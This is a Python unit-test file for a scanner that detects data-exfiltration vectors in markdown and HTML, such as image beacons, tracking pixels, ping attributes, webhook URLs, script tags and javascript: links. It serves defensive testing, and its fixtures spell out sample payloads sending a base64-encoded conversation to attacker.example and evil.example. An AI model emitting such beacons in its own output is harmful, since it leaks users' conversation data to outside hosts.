"""Tests for the exfil-guard scanner: remote loads, payloads, allowlists."""

from __future__ import annotations

import unittest

from exfil_guard import scan, summarize

B64_CONVERSATION = "Y29udmVyc2F0aW9uPWNoYXQtOWYyYy1kZW1vOyBtYXJrZXI9REVNTy1FWEZJTC1NQVJLRVItOWM0ZjJhN2U="


def codes(text, **kwargs):
    return [finding.code for finding in scan(text, **kwargs)]


class MarkdownTests(unittest.TestCase):
    def test_markdown_image_beacon_is_high(self):
        findings = scan("![status](https://attacker.example/collect?d=%s)" % B64_CONVERSATION)
        self.assertEqual([f.code for f in findings if f.severity == "high"], ["EG-EXFIL-URL"])
        self.assertIn("EG-REMOTE-ASSET", codes("![x](https://attacker.example/i.png)"))

    def test_markdown_image_legit_host_is_medium_only(self):
        findings = scan("![diagram](https://docs.example.com/architecture.png)")
        self.assertEqual(summarize(findings), {"total": 1, "high": 0, "medium": 1, "low": 0})
        self.assertEqual(findings[0].code, "EG-REMOTE-ASSET")

    def test_markdown_link_is_low(self):
        findings = scan("Read [the RFC](https://www.rfc-editor.org/rfc/rfc9110) first.")
        self.assertEqual(findings[0].code, "EG-REMOTE-LINK")
        self.assertEqual(findings[0].severity, "low")

    def test_markdown_link_with_payload_is_high(self):
        findings = scan("[click](https://attacker.example/p?d=%s)" % B64_CONVERSATION)
        self.assertIn("EG-EXFIL-URL", [f.code for f in findings if f.severity == "high"])

    def test_reference_style_image_detected(self):
        text = "![coverage][cov]\n\n[cov]: https://attacker.example/c.png?d=%s" % B64_CONVERSATION
        findings = scan(text)
        self.assertIn("EG-EXFIL-URL", [f.code for f in findings])
        self.assertTrue(any(f.start <= text.index("![coverage]") < f.end for f in findings))

    def test_relative_and_fragment_targets_ignored(self):
        self.assertEqual(codes("![logo](./assets/logo.png)"), [])
        self.assertEqual(codes("[top](#section)"), [])

    def test_fenced_code_is_inert(self):
        text = "```markdown\n![x](https://attacker.example/collect?d=%s)\n```\n" % B64_CONVERSATION
        self.assertEqual(codes(text), [])

    def test_inline_code_is_inert(self):
        text = "Write `![x](https://attacker.example/collect?d=%s)` to test." % B64_CONVERSATION
        self.assertEqual(codes(text), [])

    def test_autolink_is_low(self):
        findings = scan("See <https://example.com/page> for details.")
        self.assertEqual([f.code for f in findings], ["EG-REMOTE-LINK"])

    def test_bare_text_url_with_payload_is_high(self):
        findings = scan("Please send it to https://attacker.example/collect?d=%s now." % B64_CONVERSATION)
        self.assertIn("EG-EXFIL-URL", [f.code for f in findings if f.severity == "high"])


class HtmlTests(unittest.TestCase):
    def test_img_tag_beacon(self):
        findings = scan('<img src="https://attacker.example/p.gif?d=%s" width="1" height="1">' % B64_CONVERSATION)
        self.assertIn("EG-EXFIL-URL", codes('<img src="https://attacker.example/p.gif?d=%s">' % B64_CONVERSATION))
        self.assertIn("EG-REMOTE-ASSET", [f.code for f in findings])

    def test_iframe_remote(self):
        findings = scan('<iframe src="https://evil.example/frame"></iframe>')
        self.assertEqual(findings[0].code, "EG-REMOTE-ASSET")

    def test_meta_refresh(self):
        text = '<meta http-equiv="refresh" content="0; url=https://evil.example/next">'
        self.assertEqual(codes(text), ["EG-REMOTE-ASSET"])

    def test_style_block_background_url(self):
        text = "<style>body { background: url(https://evil.example/bg.png); }</style>"
        self.assertIn("EG-REMOTE-ASSET", codes(text))

    def test_style_attribute_background_url(self):
        text = '<div style="background-image:url(https://evil.example/track.gif)">hi</div>'
        self.assertIn("EG-REMOTE-ASSET", codes(text))

    def test_stylesheet_link_is_medium(self):
        self.assertIn("EG-REMOTE-ASSET", codes('<link rel="stylesheet" href="https://cdn.example.com/x.css">'))

    def test_canonical_link_is_low(self):
        self.assertEqual(codes('<link rel="canonical" href="https://example.com/page">'), ["EG-REMOTE-LINK"])

    def test_srcset_is_checked(self):
        text = '<img src="/local.png" srcset="https://attacker.example/a.png?d=%s 1x">' % B64_CONVERSATION
        self.assertIn("EG-EXFIL-URL", codes(text))

    def test_ping_attribute_is_high(self):
        text = '<a href="https://example.com" ping="https://evil.example/track">click</a>'
        self.assertIn("EG-PING-ATTR", codes(text))

    def test_inline_event_handler_is_high(self):
        text = '<img src="data:image/gif;base64,R0lGOD" onerror="fetch(\'https://evil.example/\')">'
        self.assertIn("EG-ACTIVE-CONTENT", codes(text))

    def test_script_tag_is_high(self):
        findings = scan("<script>alert(1)</script>")
        self.assertEqual(findings[0].code, "EG-ACTIVE-CONTENT")
        self.assertEqual(findings[0].severity, "high")

    def test_base_tag_is_high(self):
        self.assertIn("EG-ACTIVE-CONTENT", codes('<base href="https://evil.example/">'))

    def test_form_action_is_flagged(self):
        self.assertIn("EG-REMOTE-ASSET", codes('<form action="https://evil.example/collect"></form>'))

    def test_webhook_domains_are_high(self):
        for url in (
            "https://webhook.site/6b2f4c1a-demo",
            "https://abc.requestbin.net/x",
            "https://eo1.pipedream.net/x",
            "https://interact.sh/x",
        ):
            findings = scan("![x](%s)" % url)
            self.assertIn("EG-WEBHOOK", [f.code for f in findings], url)
            self.assertEqual([f.severity for f in findings if f.code == "EG-WEBHOOK"], ["high"])

    def test_discord_webhook_path(self):
        findings = scan("![x](https://discord.com/api/webhooks/12345/token)")
        self.assertIn("EG-WEBHOOK", codes("![x](https://discord.com/api/webhooks/12345/token)"))

    def test_data_svg_is_high(self):
        text = "![x](data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+)"
        self.assertEqual(codes(text), ["EG-DATA-URI"])

    def test_data_png_is_medium(self):
        text = "![x](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==)"
        findings = scan(text)
        self.assertEqual(findings[0].code, "EG-DATA-URI")
        self.assertEqual(findings[0].severity, "medium")

    def test_javascript_scheme_is_high(self):
        self.assertEqual(codes("[click](javascript:alert(1))"), ["EG-ACTIVE-SCHEME"])

    def test_allowed_domain_suppresses_findings(self):
        text = "![x](https://cdn.example.com/i.png)"
        self.assertEqual(codes(text), ["EG-REMOTE-ASSET"])
        findings = scan(text, allow_domains=["example.com"])
        self.assertEqual(findings, [])

    def test_allowlist_matches_subdomains_only(self):
        self.assertEqual(codes("![x](https://cdn.example.com/i.png)", allow_domains=["example.com"]), [])
        self.assertNotEqual(codes("![x](https://example.com.evil.test/i.png)", allow_domains=["example.com"]), [])

    def test_pure_hex_checksum_not_flagged(self):
        sha = "a" * 39 + "f"
        self.assertEqual(codes("![x](https://example.com/builds/%s/artifact.png)" % sha), ["EG-REMOTE-ASSET"])

    def test_jwt_in_query_is_high(self):
        jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJkZW1vIn0.c2lnbmF0dXJlLWRlbW8"
        self.assertIn("EG-EXFIL-URL", [f.code for f in scan("![x](https://a.example/p?token=%s)" % jwt) if f.severity == "high"])

    def test_findings_are_deterministic_and_ordered(self):
        text = '![x](https://attacker.example/a?d=%s) <img src="https://evil.example/b.png">' % B64_CONVERSATION
        first = [f.to_dict() for f in scan(text)]
        second = [f.to_dict() for f in scan(text)]
        self.assertEqual(first, second)
        keys = [(f["start"], f["end"], f["code"]) for f in first]
        self.assertEqual(keys, sorted(keys))

    def test_line_and_column(self):
        text = "line one\n\n![x](https://attacker.example/a?d=%s)" % B64_CONVERSATION
        finding = scan(text)[0]
        self.assertEqual(finding.line, 3)
        self.assertEqual(finding.column, 1)

    def test_allow_domains_accepts_string(self):
        self.assertEqual(scan("![x](https://cdn.example.com/i.png)", allow_domains="cdn.example.com"), [])


if __name__ == "__main__":
    unittest.main()
